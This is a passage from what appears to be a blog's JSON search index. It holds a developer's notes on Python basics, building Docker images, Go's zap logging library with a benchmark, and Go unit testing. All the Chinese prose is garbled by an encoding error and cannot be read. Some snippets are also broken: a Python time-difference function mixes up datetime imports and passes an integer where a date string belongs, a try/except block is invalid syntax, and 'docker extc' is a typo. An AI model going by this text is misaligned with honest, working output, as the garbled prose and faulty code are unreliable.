1\n    bee = 2\n    cat = 3\n    dog = 4\n```\n\n\n\n### 13. æ–°çš„çº¿ç¨‹å®šæ—¶æ‰§è¡Œå‡½æ•°\n\n```python\ntimer = threading.Timer(10, func)\ntimer.start()\n```\n\n\n\n### 14. PYTHONPATH \n\nä¸»è¦è§£å†³ ModuleNotFoundError: No module named 'pkg'\n\n```bash\necho $PYTHONPATH\nexport PYTHONPATH=\"/Users/liuwei/workspace/python/zk8\"\n```\n\n\n\n### 15. time\n\n```python\n# time format\nfrom datetime import datetime\ndatetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n# time diff\ndef get_time_diff(date):\n    FMT = '%Y-%m-%d %H:%M'\n    now = datetime.datetime.strptime(time.strftime(FMT), FMT)\n    start = datetime.datetime.strptime(date, FMT)\n    return (now - start).seconds\n  \n  \n# seconds to human  \nstr(datetime.timedelta(seconds=get_time_diff(10000)))\n```\n\n\n\n### 16. try catch\n\n```python\n# except and raise\ntry:\n    f = open('myfile.txt')\n    s = f.readline()\n    i = int(s.strip())\nexcept OSError as err:\n    print(\"OS error: {0}\".format(err))\nexcept ValueError:\n    print(\"Could not convert data to an integer.\")\nexcept:\n    print(\"Unexpected error:\", sys.exc_info()[0])\n    raise\n    \n\n # æ‹¿åˆ° error ä¿¡æ¯\ntry:\n  except Exception as e:\n  else:\n    \n try:\n  except Exception as e:\n  finally:\n```\n\n\n\n### 17. string\n\n```python\nstring = 'GeeksforGeeks'\nprint(string.lower()) \nprint(string.upper()) \n\n\n# contain\n>>> str = \"Messi is the best soccer player\"\n>>> \"soccer\" in str\nTrue\n```\n\n\n\n\n\n### 18. ç±»\n\n```python\n\"\"\"\nï¼ˆ1ï¼‰_xxx Â  Â  Â \"å•ä¸‹åˆ’çº¿ \" å¼€å§‹çš„æˆå‘˜å˜é‡å«åšä¿æŠ¤å˜é‡ï¼Œæ„æ€æ˜¯åªæœ‰ç±»å®ä¾‹å’Œå­ç±»å®ä¾‹èƒ½è®¿é—®åˆ°è¿™äº›å˜é‡ï¼Œ\néœ€é€šè¿‡ç±»æä¾›çš„æ¥å£è¿›è¡Œè®¿é—®ï¼›ä¸èƒ½ç”¨'from module import *'å¯¼å…¥\nï¼ˆ2ï¼‰__xxx Â  Â ç±»ä¸­çš„ç§æœ‰å˜é‡/æ–¹æ³•å ï¼ˆPythonçš„å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥æˆå‘˜æ–¹æ³•ç§°ä¸ºæˆå‘˜å˜é‡ä¹Ÿè¡Œå¾—é€šã€‚ï¼‰,\n\" åŒä¸‹åˆ’çº¿ \" å¼€å§‹çš„æ˜¯ç§æœ‰æˆå‘˜ï¼Œæ„æ€æ˜¯åªæœ‰ç±»å¯¹è±¡è‡ªå·±èƒ½è®¿é—®ï¼Œè¿å­ç±»å¯¹è±¡ä¹Ÿä¸èƒ½è®¿é—®åˆ°è¿™ä¸ªæ•°æ®ã€‚\nï¼ˆ3ï¼‰__xxx__ ç³»ç»Ÿå®šä¹‰åå­—ï¼Œå‰åå‡æœ‰ä¸€ä¸ªâ€œåŒä¸‹åˆ’çº¿â€ ä»£è¡¨pythoné‡Œç‰¹æ®Šæ–¹æ³•ä¸“ç”¨çš„æ ‡è¯†ï¼Œå¦‚ __init__ï¼ˆï¼‰ä»£è¡¨ç±»çš„æ„é€ å‡½æ•°ã€‚\n\"\"\"\n```\n\n\n\n\n\n### 19. æ‰“ä¹±list\n\n```\ncats = list(range(10, 17))\nrandom.shuffle(cats)\n```\n\n\n\n### *arg å’Œ**args\n\nhttp://www.wklken.me/posts/2013/12/21/how-to-use-args-and-kwargs-in-python.html","tags":["python"],"categories":["python"]},{"title":"è®°å½•ä¸€æ¬¡dockeré•œåƒçš„æ„å»ºè¿‡ç¨‹","url":"%2Fp%2F2450240c.html","content":"\nåœ¨åˆ¶ä½œ Docker Images ä¹‹å‰, æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹Docker å®˜æ–¹æä¾›äº†ä¸€äº›å»ºè®®å’Œå‡†åˆ™ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å»ºè®®éµå®ˆã€‚\n\n+ å®¹å™¨æ˜¯çŸ­æš‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ éœ€è¦å¯ä»¥å®¹æ˜“çš„åˆ›å»ºã€é”€æ¯ã€é…ç½®ä½ çš„å®¹å™¨ã€‚\n\n+ å¤šæ•°æƒ…å†µï¼Œæ„å»ºé•œåƒçš„æ—¶å€™æ˜¯å°† Dockerfile å’Œæ‰€éœ€æ–‡ä»¶æ”¾åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚ä½†ä¸ºäº†æ„å»ºæ€§èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ [.dockerignore](https://deepzz.com/post/dockerfile-reference.html#toc_6) æ–‡ä»¶æ¥æ’é™¤æ–‡ä»¶å’Œç›®å½•ã€‚\n\n+ é¿å…å®‰è£…ä¸å¿…è¦çš„åŒ…ï¼Œæ„å»ºé•œåƒåº”è¯¥å°½å¯èƒ½å‡å°‘å¤æ‚æ€§ã€ä¾èµ–å…³ç³»ã€æ„å»ºæ—¶é—´åŠé•œåƒå¤§å°ã€‚\n\n+ æœ€å°åŒ–å±‚æ•°ã€‚ Dockerfileçš„ä¸€è¡Œ(é™¤MAINTAINERå¤–)å¯¹åº”é•œåƒçš„ä¸€å±‚ï¼Œä¸ºä½¿å±‚æ•°è¶³å¤Ÿå°ï¼Œæ•…å¯ä»¥å°†ç±»ä¼¼çš„å‘½ä»¤ä¸²èµ·æ¥ï¼Œæ¯”å¦‚RUN æŒ‡ä»¤ï¼Œå¯ä»¥ä½¿ç”¨&&è¿æ¥å¤šä¸ªæŒ‡ä»¤ï¼Œå¦‚æ­¤ä¹Ÿåªæœ‰ä¸€å±‚ã€‚\n\n+ æ’åºå¤šè¡Œå‚æ•°ï¼Œé€šè¿‡å­—æ¯å°†å‚æ•°æ’åºæ¥ç¼“è§£ä»¥åçš„å˜åŒ–ï¼Œè¿™å°†å¸®ä½ é¿å…é‡å¤çš„åŒ…ã€ä½¿åˆ—è¡¨æ›´å®¹æ˜“æ›´æ–°ï¼Œå¦‚ï¼š\n\n```dockerfile\nRUN apt-get update && apt-get install -y \\\n  bzr \\\n  cvs \\\n  git \\\n  mercurial \\\n  subversion\n```\n\n<!-- more -->\n\n\n\n### 0. å‰è¨€\n\nå®¹å™¨å†…æ²¡æœ‰åå°æœåŠ¡çš„æ¦‚å¿µã€‚å®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±å¤±å»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œä»è€Œé€€å‡ºï¼Œå…¶å®ƒè¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚æ‰€ä»¥CMD è¿è¡Œå¯æ‰§è¡Œç¨‹åº, é˜»å¡æ‰å¯ä»¥, è¦ä¸ç„¶ä¼šé€€å‡ºã€‚\n\n\n\n###  1. FROM ä»“åº“\n\nå°½å¯èƒ½çš„ä½¿ç”¨å®˜æ–¹ä»“åº“å­˜å‚¨çš„é•œåƒä½œä¸ºåŸºç¡€é•œåƒã€‚å®˜æ–¹å»ºè®®ä½¿ç”¨ [Debian](https://hub.docker.com/_/debian/)ï¼Œå¤§å°åœ¨ 150mb å·¦å³ã€‚ä¸è¿‡åœ¨å®é™…å¼€å‘ä¸­ï¼Œåº”è¯¥ç”¨åˆ° [alpine](https://hub.docker.com/_/alpine/) çš„æ¬¡æ•°æ¯”è¾ƒå¤šï¼Œå› ä¸ºå®ƒä»… 5mb å·¦å³ã€‚ busyboxæ›´åªæœ‰1Må¤šã€‚\n\nå‚è€ƒ: https://blog.csdn.net/bbwangj/article/details/81088231\n\n\n\n### 2. æŒ‡ä»¤\n\n##### 2.1 COPY å’Œ ADD çš„åŒºåˆ«\n\nåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨COPY, ä½¿ç”¨ADDçš„å”¯ä¸€åŸå› å°±æ˜¯ä½ æœ‰ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œä½ æƒ³è‡ªåŠ¨è§£å‹åˆ°é•œåƒä¸­ã€‚\n\n##### 2.2 RUN å’Œ CMD çš„åŒºåˆ«\n\n+ RUNå‘½ä»¤æ˜¯åˆ›å»ºDockeré•œåƒçš„æ­¥éª¤ï¼Œä¸€ä¸ªDockerfileä¸­å¯ä»¥æœ‰è®¸å¤šä¸ªRUNå‘½ä»¤ã€‚\n+ CMDå‘½ä»¤æ˜¯å½“Dockeré•œåƒè¢«å¯åŠ¨åDockerå®¹å™¨å°†ä¼šé»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¸€ä¸ªDockerfileä¸­åªèƒ½æœ‰ä¸€ä¸ªCMDå‘½ä»¤ã€‚é€šè¿‡æ‰§è¡Œdocker run $image other_commandå¯åŠ¨é•œåƒå¯ä»¥é‡è½½CMDå‘½ä»¤ã€‚\n\n##### 2.3 ENTRYPOINT å’Œ CMDçš„åŒºåˆ«\n\nThe main purpose of a CMD is to provide defaults for an executing container. These defaults can include an executable, or they can omit the executable, in which case you must specify an ENTRYPOINT instruction as well.\n\nå¦‚æœdocker runæ²¡æœ‰æŒ‡å®šä»»ä½•çš„æ‰§è¡Œå‘½ä»¤æˆ–è€…dockerfileé‡Œé¢ä¹Ÿæ²¡æœ‰entrypointï¼Œé‚£ä¹ˆï¼Œå°±ä¼šä½¿ç”¨cmdæŒ‡å®šçš„é»˜è®¤çš„æ‰§è¡Œå‘½ä»¤æ‰§è¡Œã€‚åŒæ—¶ä¹Ÿä»ä¾§é¢è¯´æ˜äº†entrypointçš„å«ä¹‰ï¼Œå®ƒæ‰æ˜¯çœŸæ­£çš„å®¹å™¨å¯åŠ¨ä»¥åè¦æ‰§è¡Œå‘½ä»¤ã€‚\n\n+ CMDçš„ç”¨æ³•\n\n  ```\n  The CMD instruction has three forms:\n   \n  CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form) //æ¨è\n  CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)\n  CMD command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  \n  eg1: CMD [\"/bin/bash\", \"-c\", \"echo 'hello cmd!'\"]\n  eg2: CMD [\"hello cmd!\"]\n\t\t ENTRYPOINT [\"echo\"]\n  eg3: CMD echo \"hello cmd!\"\n  ```\n  \n  \n  \n+ entrypointçš„ç”¨æ³•\n\n  An ENTRYPOINT allows you to configure a container that will run as an executable.\n\n  ```\n  ENTRYPOINT has two forms:\n  \n  ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (exec form, preferred) //æ¨è\n  ENTRYPOINT command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  eg1: å¦‚æœå‘½ä»¤åé¢æœ‰ä¸œè¥¿ï¼Œé‚£ä¹ˆåé¢çš„å…¨éƒ¨éƒ½ä¼šä½œä¸ºentrypointçš„å‚æ•°ã€‚å¦‚æœæ²¡æœ‰ï¼Œä½†æ˜¯cmdæœ‰ï¼Œé‚£ä¹ˆcmdçš„å…¨éƒ¨å†…å®¹ä¼šä½œä¸ºentrypointçš„å‚æ•°, ä¼šè¾“å‡º hello cmd çš„\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT [\"echo\"]\n  \n  \n  \n  \n  eg2: è¿™ä¸ªæ—¶å€™æ˜¯ä¸ä¼šè¾“å‡º hello cmd çš„\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT echo\n  ```\n\n+ è¦†ç›–é—®é¢˜\n\n  + cmd é™¤éé»˜è®¤, å¦åˆ™è½»æ˜“è¢«è¦†ç›–\n\n  + entrypoint å¯ä»¥ç”¨ --entrypoint è¦†ç›–\n\n  + æ‰€ä»¥å»ºè®®entrypointå›ºå®š, cmd è¢«è¦†ç›–, ç»“åˆä½¿ç”¨, å¹¶ä¸”æ°¸è¿œä½¿ç”¨Execè¡¨ç¤ºæ³•\n\n\n\n##### 2.9 ç¯å¢ƒå˜é‡å†™æ³•\n\n```\nENV KS_HAVEN_ADDR=':16097' \\\nKS_HAVEN_QUIC_ADDR=':16097'\n```\n\n\n\n### 3. æ„å»ºé•œåƒ\n\nåœ¨ Dockerfile æ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š    `docker build -t image_name .`\n\n\n\n##### 3.1 æ„å»ºçš„ä¸Šä¸‹æ–‡\n\n1. c/sæ¶æ„, åœ¨æœåŠ¡ç«¯æ„å»º\n2. æœåŠ¡ç«¯è¦è·å–æ–‡ä»¶, éœ€è¦æŠŠä¸Šä¸‹æ–‡ç›®å½•æ‰“åŒ…å‘è¿‡å» (COPY ../package.json /app æˆ–è€… COPY /opt/xxxx /app æ— æ³•æˆåŠŸ, è¶…å‡ºäº†ä¸Šä¸‹æ–‡)\n3. æœ€å¥½å°†dockerfileæ”¾åœ¨ç©ºç›®å½•ä¸‹æˆ–é¡¹ç›®æ ¹ç›®å½•ä¸‹, å¦‚æœæ²¡æœ‰æ‰€éœ€æ–‡ä»¶,æ‹·è´è¿‡æ¥, é¿å…å‘é€å¤ªå¤šæ–‡ä»¶ç»™å¼•æ“\n\n\n\n##### 3.2 é•œåƒ save load\n\n```bash\ndocker images #æŸ¥çœ‹æ„å»ºçš„image\n\ndocker save image/test > image_test.tar.gz # save image\n\ndocker load -i image_test.tar.gz # load image\n```\n\n\n\n### 4. å®¹å™¨æ“ä½œ\n\n\n\n##### 4.1 è¿è¡Œå’Œè¿›å…¥å®¹å™¨\n\n```bash\ndocker run -d -p 16097:16097 -p 15098:15098  image_name # å¯åŠ¨å®¹å™¨\n\ndocker extc -it å®¹å™¨åå­— bash # è¿›å…¥å®¹å™¨å†…éƒ¨\ndocker exec -it å®¹å™¨ID  sh   # è¿›å…¥å®¹å™¨å†…éƒ¨\n```\n\n\n\n##### 4.2 çœ‹å®¹å™¨log\n\n```bash\ndocker logs -f CONTAINER_ID\n\ndocker logs -f --tail=100 CONTAINER_ID\n```\n\n\n\n##### 4.3 å®¹å™¨å’Œå®¿ä¸»æ‹·è´å†…å®¹\n\n```bash\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp mycontainer:/foo.txt foo.txt\n```\n\n\n\n##### 4.4 å®¹å™¨è®¿é—®å®¿ä¸»ä¸»æœºç«¯å£\n\n+ https://jingsam.github.io/2018/10/16/host-in-docker.html\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/wdq347/article/details/78753322 dockerä¹‹é•œåƒåˆ¶ä½œ\n+ https://deepzz.com/post/dockerfile-best-practices.html  å¦‚ä½•å†™å¥½Dockerfileï¼ŒDockerfileæœ€ä½³å®è·µ","tags":["docker"],"categories":["docker"]},{"title":"golangçš„logåº“zapçš„ä½¿ç”¨","url":"%2Fp%2F5d303099.html","content":"\n\n\n### 0. å‰è¨€\n\næ—¥å¿—ä½œä¸ºæ•´ä¸ªä»£ç è¡Œä¸ºçš„è®°å½•ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œé€»è¾‘å’Œå¼‚å¸¸æœ€ç›´æ¥çš„åé¦ˆã€‚å¯¹äºæ•´ä¸ªç³»ç»Ÿæ¥è¯´ï¼Œæ—¥å¿—æ˜¯è‡³å…³é‡è¦çš„ç»„æˆéƒ¨åˆ†ã€‚é€šè¿‡åˆ†ææ—¥å¿—æˆ‘ä»¬ä¸ä»…å¯ä»¥å‘ç°ç³»ç»Ÿçš„é—®é¢˜ï¼ŒåŒæ—¶æ—¥å¿—ä¸­ä¹Ÿè•´å«äº†å¤§é‡æœ‰ä»·å€¼å¯ä»¥è¢«æŒ–æ˜çš„ä¿¡æ¯ï¼Œå› æ­¤åˆç†åœ°è®°å½•æ—¥å¿—æ˜¯ååˆ†å¿…è¦çš„ã€‚\n\n<!-- more -->\n\n### 1. golang log libs\n\nç›®å‰golangä¸»æµçš„ logåº“æœ‰\n\n+ https://github.com/uber-go/zap\n+ https://github.com/Sirupsen/logrus\n\nzap è·Ÿ logrus ä»¥åŠç›®å‰ä¸»æµçš„ go è¯­è¨€ log ç±»ä¼¼ï¼Œæå€¡é‡‡ç”¨ç»“æ„åŒ–çš„æ—¥å¿—æ ¼å¼ï¼Œè€Œä¸æ˜¯å°†æ‰€æœ‰æ¶ˆæ¯æ”¾åˆ°æ¶ˆæ¯ä½“ä¸­ï¼Œç®€å•æ¥è®²ï¼Œæ—¥å¿—æœ‰ä¸¤ä¸ªæ¦‚å¿µï¼šå­—æ®µå’Œæ¶ˆæ¯ã€‚å­—æ®µç”¨æ¥ç»“æ„åŒ–è¾“å‡ºé”™è¯¯ç›¸å…³çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè€Œæ¶ˆæ¯ç®€æ˜æ‰¼è¦çš„é˜è¿°é”™è¯¯æœ¬èº«ã€‚\n\n##### 1.1 logåº“ä½¿ç”¨å’Œæ€§èƒ½å¯¹æ¯”\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"math/rand\"\n\t\"time\"\n\n\t\"github.com/golang/glog\"\n\t\"github.com/sirupsen/logrus\"\n\t\"go.uber.org/zap\"\n)\n\ntype dummy struct {\n\tFoo string `json:\"foo\"`\n\tBar string `json:\"bar\"`\n}\n\nconst letterBytes = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nconst (\n\tletterIdxBits = 6                    // 6 bits to represent a letter index\n\tletterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\n\tletterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits\n)\n\nfunc RandString(n int) string {\n\tb := make([]byte, n)\n\t// A rand.Int63() generates 63 random bits, enough for letterIdxMax letters!\n\tfor i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {\n\t\tif remain == 0 {\n\t\t\tcache, remain = rand.Int63(), letterIdxMax\n\t\t}\n\t\tif idx := int(cache & letterIdxMask); idx < len(letterBytes) {\n\t\t\tb[i] = letterBytes[idx]\n\t\t\ti--\n\t\t}\n\t\tcache >>= letterIdxBits\n\t\tremain--\n\t}\n\treturn string(b)\n}\n\nfunc dummyData() interface{} {\n\treturn dummy{\n\t\tFoo: RandString(12),\n\t\tBar: RandString(16),\n\t}\n}\n\nfunc main() {\n\n\t// logrus\n\tvar x int64 = 0\n\tt := time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tlogrus.WithField(\"Dummy\", dummyData()).Infoln(\"this is a dummy log\")\n\t}\n\tx += time.Since(t).Nanoseconds()\n\n\t// zap\n\tzlogger, _ := zap.NewProduction()\n\tsugar := zlogger.Sugar()\n\tvar y int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tsugar.Infow(\"this is a dummy log\", \"Dummy\", dummyData())\n\t}\n\ty += time.Since(t).Nanoseconds()\n\n\t// stdlog\n\tvar z int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tdummyStr, _ := json.Marshal(dummyData())\n\t\tlog.Printf(\"this is a dummy log: %s\\n\", string(dummyStr))\n\t}\n\tz += time.Since(t).Nanoseconds()\n\n\t// glog\n\tvar w int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tglog.Info(\"\\nthis is a dummy log: \", dummyData())\n\t}\n\tw += time.Since(t).Nanoseconds()\n\n\t// print\n\tfmt.Println(\"=====================\")\n\tfmt.Printf(\"Logrus: %5d ns per request \\n\", x/10000)\n\tfmt.Printf(\"Zap:    %5d ns per request \\n\", y/10000)\n\tfmt.Printf(\"StdLog: %5d ns per request \\n\", z/10000)\n\tfmt.Printf(\"Glog:   %5d ns per request \\n\", w/10000)\n}\n\n\n/*\n=====================\nLogrus: 19305 ns per request\nZap:     1095 ns per request\nStdLog:  7137 ns per request\nGlog:   12070 ns per request\n*/\n```\n\n\n\n### 2. zap ä½¿ç”¨\n\n+ sugaræ¨¡å¼ (ç‰ºç‰²æ€§èƒ½ä¸ºä»£ä»·,å¢å¼ºå¯ç”¨æ€§)\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tsugar := logger.Sugar()\n\tsugar.Infow(\"failed to fetch URL\",\n\t\t\"url\", url,\n\t\t\"attempt\", 3,\n\t\t\"backoff\", time.Second,\n\t)\n\n\tsugar.Infof(\"Failed to fetch URL: %s\", url)\n}\n\n\n// æ³¨æ„ infow å’Œ infof çš„è°ƒç”¨åŒºåˆ«\n\n/*\n{\"level\":\"info\",\"ts\":1566623998.1506088,\"caller\":\"log/main.go:15\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n \n{\"level\":\"info\",\"ts\":1566623998.15073,\"caller\":\"log/main.go:20\",\"msg\":\"Failed to fetch URL: https://www.liuvv.com\"}\n*/\n```\n\n+ logger æ¨¡å¼\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", url),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n\n\t//logger.Infow() //æ²¡æœ‰æ­¤å‡½æ•°\n\t//logger.Infof() //æ²¡æœ‰æ­¤å‡½æ•°\n}\n\n\n/*\n{\"level\":\"info\",\"ts\":1566624270.4984472,\"caller\":\"log/main.go:14\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n*/\n```\n\n\n\n##### 2.1 zapåºåˆ—åŒ–è¾“å‡º\n\n```\nzap.NewDevelopment() //æ ¼å¼åŒ–è¾“å‡º\nzap.NewProduction() //jsonåºåˆ—åŒ–è¾“å‡º\n```\n\n\n\n##### 2.2 è¾“å‡ºåˆ°æ–‡ä»¶é‡Œ\n\n```go\nfunc NewLogger() (*zap.Logger, error) {\n  cfg := zap.NewProductionConfig()\n  cfg.OutputPaths = []string{\n    \"/var/log/myproject/myproject.log\",\n  }\n  return cfg.Build()\n}\n```\n\n\n\n##### 2.3 è¾“å…¥åˆ°æ»šåŠ¨æ–‡ä»¶é‡Œ\n\nLumberjackç”¨äºå°†æ—¥å¿—å†™å…¥æ»šåŠ¨æ–‡ä»¶ã€‚zap ä¸æ”¯æŒæ–‡ä»¶å½’æ¡£ï¼Œå¦‚æœè¦æ”¯æŒæ–‡ä»¶æŒ‰å¤§å°æˆ–è€…æ—¶é—´å½’æ¡£ï¼Œéœ€è¦ä½¿ç”¨lumberjackï¼Œlumberjackä¹Ÿæ˜¯zapå®˜æ–¹æ¨èçš„ã€‚https://github.com/natefinch/lumberjack\n\n```go\nfunc main() {\n\t// lumberjack.Logger is already safe for concurrent use, so we don't need to\n\t// lock it.\n\thook := &lumberjack.Logger{\n\t\tFilename:   \"/tmp/foo.log\", // æ—¥å¿—æ–‡ä»¶è·¯å¾„\n\t\tMaxSize:    500,            // æ¯ä¸ªæ—¥å¿—æ–‡ä»¶ä¿å­˜çš„æœ€å¤§å°ºå¯¸ å•ä½ï¼šM\n\t\tMaxBackups: 3,              // æ—¥å¿—æ–‡ä»¶æœ€å¤šä¿å­˜å¤šå°‘ä¸ªå¤‡ä»½\n\t\tMaxAge:     28,             // æ–‡ä»¶æœ€å¤šä¿å­˜å¤šå°‘å¤©\n\t\tCompress:   true,           // æ˜¯å¦å‹ç¼©\n\t}\n\tcore := zapcore.NewCore(\n\t\tzapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),                       // ç¼–ç å™¨é…ç½®\n\t\tzapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), zapcore.AddSync(hook)), // æ‰“å°åˆ°æ§åˆ¶å°å’Œæ–‡ä»¶\n\t\tzap.InfoLevel, // æ—¥å¿—çº§åˆ«\n\t)\n\n\tlogger := zap.New(core)\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", \"https://www.liuvv.com\"),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n}\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/41991119","tags":["golang"],"categories":["golang"]},{"title":"golangç¼–å†™æµ‹è¯•ç”¨ä¾‹","url":"%2Fp%2F269bf134.html","content":"\n\n\n### 1. Learn Go with tests\n\nå½“å­¦ä¹ ä¸€é—¨è¯­è¨€æ—¶, æœ€æœ‰æ•ˆçš„åŠæ³•ä¸æ˜¯æ¯ä¸€ç« çš„å»é˜…è¯»æ¦‚å¿µ, è€Œæ˜¯é€šè¿‡ä¾‹å­æ¢ç´¢å­¦ä¹ .\n\nå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡ Go è¯­è¨€çš„, å¼ºçƒˆå»ºè®®é€šè¿‡ç¼–å†™æµ‹è¯•å­¦ä¹  Go è¯­è¨€, ä¸ä»…ä¸ºæµ‹è¯•é©±åŠ¨å¼€å‘æ‰“ä¸‹åŸºç¡€, è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ Go è¯­è¨€ç¼–å†™å¥å£®çš„ã€ç»è¿‡è‰¯å¥½æµ‹è¯•çš„ç³»ç»Ÿ.\n\nå¼ºçƒˆæ¨è: https://github.com/quii/learn-go-with-tests\n\n<!-- more -->\n\n\n\n### 2. Golang Test\n\nGoè¯­è¨€ä¸­è‡ªå¸¦æœ‰ä¸€ä¸ªè½»é‡çº§çš„æµ‹è¯•æ¡†æ¶`testing`å’Œè‡ªå¸¦çš„`go test`å‘½ä»¤æ¥å®ç°å•å…ƒæµ‹è¯•å’Œæ€§èƒ½æµ‹è¯•ï¼Œ`testing`æ¡†æ¶å’Œå…¶ä»–è¯­è¨€ä¸­çš„æµ‹è¯•æ¡†æ¶ç±»ä¼¼ï¼Œä½ å¯ä»¥åŸºäºè¿™ä¸ªæ¡†æ¶å†™é’ˆå¯¹ç›¸åº”å‡½æ•°çš„æµ‹è¯•ç”¨ä¾‹ï¼Œä¹Ÿå¯ä»¥åŸºäºè¯¥æ¡†æ¶å†™ç›¸åº”çš„å‹åŠ›æµ‹è¯•ç”¨ä¾‹ã€‚æµ‹è¯•ç”¨ä¾‹æœ‰å››ç§å½¢å¼ï¼š \n\n+ TestXxxx(t *testing.T) // å•å…ƒæµ‹è¯•\n+ TestBenchmarkXxxx(b* testing.B) // å‹åŠ›æµ‹è¯•\n+ Example_Xxx() // æµ‹è¯•æ§åˆ¶å°è¾“å‡ºçš„ä¾‹å­ \n+ TestMain(m *testing.M) // æµ‹è¯•Mainå‡½æ•°\n\nå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„æµ‹è¯•æ¡†æ¶, æ›´åŠ é«˜æ•ˆçš„æµ‹è¯•æˆ‘ä»¬çš„ä»£ç :\n\nhttps://github.com/stretchr/testify\n\n\n\n###  3. å•å…ƒæµ‹è¯•\n\n\n+ éœ€è¦åˆ›å»ºä¸€ä¸ªåç§°ä»¥ _test.go ç»“å°¾çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å« `TestXxx` å‡½æ•°\n+ `func TestXxx(*testing.T)`   // Xxx å¯ä»¥æ˜¯ä»»ä½•å­—æ¯æ•°å­—å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªå­—æ¯ä¸èƒ½æ˜¯å°äº›å­—æ¯ã€‚\n+ å•å…ƒæµ‹è¯•ä¸­ï¼Œä¼ é€’ç»™æµ‹è¯•å‡½æ•°çš„å‚æ•°æ˜¯ `*testing.T` ç±»å‹ã€‚\n\n\n\n##### 3.1 å•å…ƒæµ‹è¯•æ–¹æ³•\n\n+ å½“æˆ‘ä»¬é‡åˆ°ä¸€ä¸ªæ–­è¨€é”™è¯¯çš„æ—¶å€™ï¼Œæ ‡è¯†è¿™ä¸ªæµ‹è¯•å¤±è´¥ï¼Œä¼šä½¿ç”¨åˆ°ï¼š\n\n  ```\n  Fail: æµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•ç»§ç»­ï¼Œä¹Ÿå°±æ˜¯ä¹‹åçš„ä»£ç ä¾ç„¶ä¼šæ‰§è¡Œ\n  FailNow: æµ‹è¯•å¤±è´¥ï¼Œæµ‹è¯•ä¸­æ–­\n  ```\n\n+ å½“æˆ‘ä»¬åªå¸Œæœ›æ‰“å°ä¿¡æ¯ï¼Œä¼šç”¨åˆ°:\n\n  ```\n  Log: è¾“å‡ºä¿¡æ¯\n  Logf: è¾“å‡ºæ ¼å¼åŒ–çš„ä¿¡æ¯\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œä¸å¸Œæœ›æ ‡è¯†æµ‹è¯•å¤±è´¥ï¼Œä¼šç”¨åˆ°ï¼š\n\n  ```\n  Skip: ç›¸å½“äº Log + SkipNow\n  Skipf: ç›¸å½“äº Logf + SkipNow\n  SkipNow: è·³è¿‡æµ‹è¯•ï¼Œæµ‹è¯•ä¸­æ–­\n  ```\n\n+ å½“æˆ‘ä»¬æ–­è¨€å¤±è´¥çš„æ—¶å€™ï¼Œå¸Œæœ›æ 